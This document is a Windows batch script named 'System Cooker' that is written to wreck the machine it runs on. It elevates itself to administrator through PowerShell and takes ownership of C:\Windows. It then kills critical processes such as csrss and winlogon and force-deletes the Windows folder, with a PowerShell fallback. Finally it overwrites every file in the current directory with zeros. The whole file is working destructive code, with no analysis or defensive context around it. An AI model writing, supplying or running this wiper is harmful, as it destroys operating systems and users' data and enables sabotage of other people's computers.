@echo off
title System Cooker - Ultimate
color 0c

:: Check if running as Administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Not running as Administrator. Restarting with elevated privileges...
    powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%~dpnx0\"' -Verb RunAs"
    exit /b
)

echo Running as Administrator.
echo Starting PC Cooker...
echo.

:: Wait 10 seconds
timeout /t 10 /nobreak >nul

:: 1. Take ownership of C:\Windows
echo Taking ownership of C:\Windows...
takeown /f C:\Windows /r /d y >nul 2>&1

:: 2. Grant Full Control to Administrators
echo Granting full control...
icacls C:\Windows /grant administrators:F /t >nul 2>&1

:: 3. Kill processes that might be holding files open (optional, but helps)
echo Killing critical processes...
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im svchost.exe >nul 2>&1
taskkill /f /im csrss.exe >nul 2>&1
taskkill /f /im winlogon.exe >nul 2>&1

:: 4. Forcefully delete the Windows folder
echo Deleting C:\Windows...
rmdir /s /q C:\Windows

:: 5. If rmdir failed, try with PowerShell as a fallback
if exist C:\Windows (
    echo rmdir failed. Trying PowerShell...
    powershell -Command "Remove-Item -Path 'C:\Windows' -Recurse -Force"
)

:: 6. Corrupt all files in the current directory
echo Corrupting files in %cd%...
for %%f in (*) do (
    if not "%%f"=="%~n0.bat" (
        echo 00000000000000000000000000000000 > "%%f"
    )
)

:: Optional: Show a final message
echo.
echo PC Cooked! Windows folder deleted and files corrupted.
echo.
pause
